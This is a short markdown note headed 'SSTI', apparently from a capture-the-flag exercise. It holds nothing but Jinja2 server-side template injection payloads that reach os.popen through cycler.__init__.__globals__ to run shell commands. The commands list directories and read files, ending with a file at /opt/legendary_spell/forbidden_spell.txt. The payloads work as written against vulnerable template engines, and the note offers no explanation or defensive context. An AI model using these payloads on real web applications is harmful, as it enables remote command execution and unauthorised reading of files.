# SSTI

# {{cycler.__init__.__globals__.os.popen('').read( )}}
## {{cycler.__init__.__globals__.os.popen('ls').read( )}}
## {{cycler.__init__.__globals__.os.popen('cat legend.txt').read( )}}
## {{ cycler.__init__.__globals__.os.popen('ls /opt').read() }}
## {{ cycler.__init__.__globals__.os.popen('ls /opt/legendary_spell').read() }}
## {{ cycler.__init__.__globals__.os.popen('cat /opt/legendary_spell/forbidden_spell.txt').read() }}
